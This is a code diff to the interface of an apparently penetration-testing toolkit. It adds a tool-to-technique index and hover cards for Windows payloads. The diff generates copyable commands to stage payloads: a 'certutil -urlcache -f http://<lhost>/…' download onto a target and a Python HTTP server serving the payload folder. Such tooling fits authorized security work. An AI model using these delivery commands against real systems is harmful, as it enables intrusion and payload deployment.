@@ -19,6 +19,25 @@
   // category → CSS color-class slug (lo-catc-<slug>); the colors live in obol.css so they follow the skin.
   function catSlug(c) { return String(c || 'support').toLowerCase().replace(/[^a-z0-9]+/g, '-'); }
 
+  // tool key → the methodology moves that use it (built once from the loaded packs' declared tools).
+  var _moveIdx = null;
+  function moveIndex() {
+    if (_moveIdx) return _moveIdx;
+    _moveIdx = {};
+    var A = OBOL.ARSENAL || {}, acts = [];
+    try { acts = (OBOL.packs && typeof OBOL.packs.actions === 'function') ? (OBOL.packs.actions() || []) : []; } catch (e) { acts = []; }
+    acts.forEach(function (a) {
+      var ts = []; if (a.tool) ts.push(a.tool); if (a.tools && a.tools.length) ts = ts.concat(a.tools);
+      var seen = {};
+      ts.forEach(function (t) {
+        if (!t) return; var e = A[String(t).toLowerCase()]; if (!e || seen[e.key]) return; seen[e.key] = 1;
+        var list = (_moveIdx[e.key] = _moveIdx[e.key] || []);
+        if (a.title && list.indexOf(a.title) < 0) list.push(a.title);
+      });
+    });
+    return _moveIdx;
+  }
+
   var _hideKali = true;   // "to fetch" view by default — the tools Kali doesn't already ship
   var _boxLens = 'fs';    // "Your Box" grouping: 'fs' (where it lives) | 'cap' (what it's for)
 
@@ -235,15 +254,32 @@
     };
     function resolveDest(f) { return byDest[f] || EXTRA[f] || null; }
 
-    // hover card for a tool chip: name, colored category, what-it-is/for, invocation + where it lives.
+    // serve context: where the Windows payloads live + the operator's VPN IP (for target-side download lines).
+    var wwwdir = prof.wwwdir || '~/.obol/arsenal/www';
+    var lhost = '<lhost>'; try { lhost = ((OBOL.store.active() || {}).params || {}).lhost || '<lhost>'; } catch (e) {}
+    var idx = moveIndex();
+
+    // hover card for a tool chip: name, colored category, what it's for, example, where used, and (for a
+    // Windows payload) the one-liner to pull it onto the target once you're serving ~/.obol/arsenal/www.
     function card(e, inv, path) {
       if (!e) return '';
       var cat = e.category || 'Support';
+      var isWin = !!(path && path.indexOf('/arsenal/win/') >= 0);
+      var uses = (e.key && idx[e.key]) || [];
+      var deliver = '';
+      if (isWin) {
+        var fn = path.split('/').pop();
+        var dl = 'certutil -urlcache -f http://' + lhost + '/' + fn + ' ' + fn;
+        deliver = '<span class="lo-ti-eg"><span class="lo-ti-eg-l">Deliver to target</span>'
+          + '<code class="btn-copy lo-ti-dl" data-copy="' + U.attr(dl) + '" title="Click to copy">' + esc(dl) + '</code></span>';
+      }
       return '<span class="lo-ti-card" role="tooltip">'
         + '<span class="lo-ti-card-h"><span class="lo-ti-name">' + esc(e.label || e.key) + '</span>'
         + '<span class="lo-cat-badge lo-catc-' + catSlug(cat) + '">' + esc(titleCase(cat)) + '</span></span>'
         + ((e.desc || e.purpose) ? '<span class="lo-ti-why">' + esc(cap1(e.desc || e.purpose)) + '</span>' : '')
         + (e.example ? '<span class="lo-ti-eg"><span class="lo-ti-eg-l">Example</span><code>' + esc(e.example) + '</code></span>' : '')
+        + deliver
+        + (uses.length ? '<span class="lo-ti-uses"><span class="lo-ti-eg-l">Used in</span> ' + uses.slice(0, 3).map(esc).join(' · ') + (uses.length > 3 ? ' <span class="lo-dim">+' + (uses.length - 3) + '</span>' : '') + '</span>' : '')
         + '<span class="lo-ti-meta">' + (inv ? '<code class="lo-ti-inv">' + esc(inv) + '</code>' : '')
         + (path ? '<code class="lo-ti-path">' + esc(path) + '</code>' : '') + '</span></span>';
     }
@@ -271,7 +307,13 @@
     function winItem(f) { var e = resolveDest(f); return { label: f, e: e, inv: (e && e.canonical) || '', path: '~/.obol/arsenal/win/' + f }; }
     function keyItem(k, path) { var e = A[k]; return { label: (e && e.label) || k, e: e, inv: (tools[k] && tools[k].invocation) || (e && e.canonical) || k, path: path }; }
     var winNames = staged.length ? staged : winCache.map(function (k) { return (A[k] && A[k].dest) || k; });
-    var fsRows = node('~/.obol/arsenal/win', winNames.map(winItem))
+    var serveCmd = 'cd ' + wwwdir + ' && python3 -m http.server 80';
+    var serveHelper = winNames.length
+      ? '<div class="lo-serve"><span class="lo-serve-t">Serve these to a target</span>'
+        + '<code class="btn-copy lo-serve-cmd" data-copy="' + U.attr(serveCmd) + '" title="Click to copy">' + esc(serveCmd) + '</code>'
+        + '<span class="lo-serve-hint">then pull each from the target (hover a payload)</span></div>'
+      : '';
+    var fsRows = node('~/.obol/arsenal/win', winNames.map(winItem)) + serveHelper
       + node('~/.obol/arsenal', linCache.map(function (k) { return keyItem(k, '~/.obol/arsenal/' + ((A[k] && A[k].dest) || k)); }))
       + node('~/.local/bin', pipx.map(function (k) { return keyItem(k, (tools[k] && tools[k].path) || ''); }))
       + node('~/tools', cloned.map(function (k) { return keyItem(k, (prof.cloned && prof.cloned[k]) || (tools[k] && tools[k].path) || ''); }))
